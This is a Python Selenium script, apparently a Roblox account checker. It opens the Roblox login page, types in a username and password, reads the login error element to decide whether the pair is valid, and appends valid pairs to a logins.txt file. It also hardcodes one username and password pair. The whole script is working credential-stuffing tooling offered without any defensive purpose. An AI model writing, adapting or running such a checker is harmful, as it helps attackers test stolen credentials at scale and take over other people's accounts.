from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from colorama import Fore
import time


r = Fore.RED
g = Fore.GREEN
b = Fore.BLUE
c = Fore.CYAN
m = Fore.LIGHTMAGENTA_EX
y = Fore.LIGHTYELLOW_EX
w = Fore.WHITE


def checker(bot, username: str, password: str):
    bot.get("https://www.roblox.com/login")

    usernameInput = bot.find_element_by_xpath('//*[@id="login-username"]')
    passwordInput = bot.find_element_by_xpath('//*[@id="login-password"]')
    login = bot.find_element_by_xpath('//button[@id="login-button"]')

    # Username
    usernameInput.clear()
    usernameInput.send_keys(username)

    # Password
    passwordInput.clear()
    passwordInput.send_keys(password)

    # Login
    bot.execute_script("arguments[0].click();", login)
    time.sleep(20)

    try:
        if str(bot.find_element_by_xpath('//p[@class="form-control-label xsmall text-error login-error ng-binding"]')) != "":
            log(username, password, False)
            return False
        else:
            log(username, password, True)
            return True
    except:
        log(username, password, True)
        return True


def log(username, password, valid):
    if valid == True:
        print(f"[{g}Username{w}] {y}{username}{w} \n[{b}Password{w}] {y}{password}{w} \n[{m}Account-Valid{w}] {g}Valid{w}\n\n")

        with open("./logins.txt", "a") as f:
            f.write(f"[Info] {username}:{password}\n")

    elif valid == False:
        print(f"[{g}Username{w}] {y}{username}{w} \n[{b}Password{w}] {y}{password}{w} \n[{m}Account-Valid{w}] {r}Invalid{w}\n\n")

    else:
        pass


options = Options()
options.headless = False
options.add_experimental_option("excludeSwitches", ["enable-logging"])
bot = webdriver.Chrome(chrome_options=options)
bot.get("https://roblox.com")
time.sleep(3)
checker(bot, "ap158sad", "Nlurwwtu10")
